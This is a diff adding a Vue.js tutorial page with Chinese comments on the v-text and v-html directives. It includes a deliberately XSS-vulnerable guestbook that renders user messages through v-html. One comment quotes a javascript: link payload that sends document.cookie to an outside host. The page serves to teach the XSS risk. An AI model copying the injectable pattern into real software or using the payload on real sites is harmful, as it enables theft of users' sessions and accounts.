@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vue的其他指令</title>
+    <script src="../js/vue.js"></script>
+</head>
+<body>
+    <div id="app">
+        <h1>{{msg}},haha</h1>
+        <!-- 
+            v-text指令：
+                可以将指令的内容拿出来填充到标签体当中。和JS的innerText一样。
+                这种填充是以覆盖的形式进行的。先清空标签体当中原有的内容，填充新的内容。
+                即使内容是一段HTML代码，这种方式也不会将HTML代码解析并执行，只会当做普通文本来处理。
+        -->
+        <h1 v-text="msg">呵呵</h1>
+        <h1 v-text="name">哈哈</h1>
+        <h1 v-text="s1"></h1>
+
+
+        <!-- 
+            v-html指令：
+                和v-text一样，也是填充标签体内容。也是采用覆盖的形式进行。
+                只不过v-html会将内容当做一段HTML代码解析并执行。
+                和JS中的innerHTML功能一样。存在XSS攻击的安全隐患。
+        -->
+        <h1 v-html="s1"></h1>
+        <!-- 
+            演示XSS攻击
+                以下代码实现了一个简易的留言板功能，用户可以留言，系统会将留言显示。
+                由于留言板采用的是v-html指令，会将每条留言内容当做一个HTML代码解析并执行
+                这是如果有恶意用户输入如下留言 <a href="http://www.baidu.com">百度</a>
+                当其他用户点击此留言时就会进入到一个网页，造成安全隐患
+
+            本地浏览器中有一个cookie，保存了账户和密码(7天免登录等就是使用cookie实现的)
+            如果恶意用户留言
+            <a href="javascript:location.href='http://www.baidu.com?'+document.cookie">点我给你看点好玩的</a>
+            其他用户点击时，就会将本地的cookie提交给恶意服务器，导致信息泄露
+        -->
+        <ul>
+            <li v-for="(m,index) in messageList" :key="index" v-html="m"></li>
+        </ul>
+        <textarea cols="30" rows="10" v-model.lazy="message"></textarea>
+        <br><br>
+        <button @click="add">保存留言</button>
+    </div>
+
+    <script>
+        const vm =  new Vue({
+            el: '#app',
+            data: {
+                msg: 'Vue的其他指令',
+                name: 'jack',
+                s1: '<h1>欢迎大家来学习Vue！</h1>',
+                message: '',
+                messageList: ['我来了','我是第二个'],
+            },
+            methods: {
+                add(){
+                    this.messageList.push(this.message)
+                }
+            }
+        })
+    </script>
+</body>
+</html>
